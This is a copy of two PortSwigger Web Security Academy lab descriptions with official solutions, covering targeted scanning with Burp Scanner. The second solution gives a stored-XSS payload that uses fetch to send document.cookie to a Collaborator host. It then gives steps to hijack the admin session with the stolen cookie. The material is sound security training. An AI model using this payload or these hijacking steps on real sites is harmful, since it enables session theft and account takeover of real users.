# PortSwigger labs: essential skills

> Copied from <https://portswigger.net/web-security/essential-skills>. Questions and answers are the source's own; nothing was answered or rewritten here.


## 1. Discovering vulnerabilities quickly with targeted scanning

[Open the lab](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)

This lab contains a vulnerability that enables you to read arbitrary files from the server. To solve the lab, retrieve the contents of `/etc/passwd` within 10 minutes.

Due to the tight time limit, we recommend using Burp Scanner to help you. You can obviously scan the entire site to identify the vulnerability, but this might not leave you enough time to solve the lab. Instead, use your intuition to identify endpoints that are likely to be vulnerable, then try running a
[targeted scan on a specific request](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing#scanning-a-specific-request). Once Burp Scanner has identified an attack vector, you can use your own expertise to find a way to exploit it.

<details><summary>Hint</summary>

If you get stuck, try looking up our Academy topic on the identified vulnerability class.

</details>

<details><summary>Official solution</summary>

This lab is designed to help you learn how targeted scans can assist you with basic recon. As such, we will not be providing a step-by-step solution.

</details>


## 2. Scanning non-standard data structures

[Open the lab](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures)

This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use Burp Scanner's **Scan selected insertion point** feature to identify the vulnerability, then manually exploit it and delete `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

<details><summary>Official solution</summary>

**Identify the vulnerability**

1. Log in to your account with the provided credentials.
2. In Burp, go to the **Proxy > HTTP history** tab.
3. Find the `GET /my-account?id=wiener` request, which contains your new authenticated session cookie.
4. Study the session cookie and notice that it contains your username in cleartext, followed by a token of some kind. These are separated by a colon, which suggests that the application may treat the cookie value as two distinct inputs.
5. Select the first part of the session cookie, the cleartext `wiener`.
6. Right-click and select **Scan selected insertion point**, then click **OK**.
7. Go to the **Dashboard** and wait for the scan to complete.

Approximately one minute after the scan starts, notice that Burp Scanner reports a **Cross-site scripting (stored)** issue. It has detected this by triggering an interaction with the Burp Collaborator server.

#### Note

The delay in reporting the issue is due to the polling interval. By default, Burp polls the Burp Collaborator server for new interactions every minute.

**Steal the admin user's cookies**

1. In the **Dashboard**, select the identified issue.
2. In the lower panel, open the **Request** tab. This contains the request that Burp Scanner used to identify the issue.
3. Send the request to Burp Repeater.
4. Go to the **Collaborator** tab and click **Copy to clipboard**. A new Burp Collaborator payload is saved to your clipboard.
5. Go to the **Repeater** tab and use the Inspector to view the cookie in its decoded form.
6. Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner
   used with an exploit that exfiltrates the victim's cookies. For example:
   `` '"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID ``

   Note that you need to preserve the second part of the cookie containing your session ID.
7. Click **Apply changes**, and then click **Send**.
8. Go back to the **Collaborator** tab. After approximately one minute, click **Poll now**. Notice that the Collaborator server has received new DNS and HTTP interactions.
9. Select one of the HTTP interactions.
10. On the **Request to Collaborator** tab, notice that the path of the request contains the admin user's cookies.

**Use the admin user's cookie to access the admin panel**

1. Copy the admin user's session cookie.
2. Go to Burp's browser and open the **DevTools** menu.
3. Go to the **Application** tab and select **Cookies**.
4. Replace your session cookie with the admin user's session cookie, and refresh the page.
5. Access the admin panel and delete `carlos` to solve the lab.

</details>

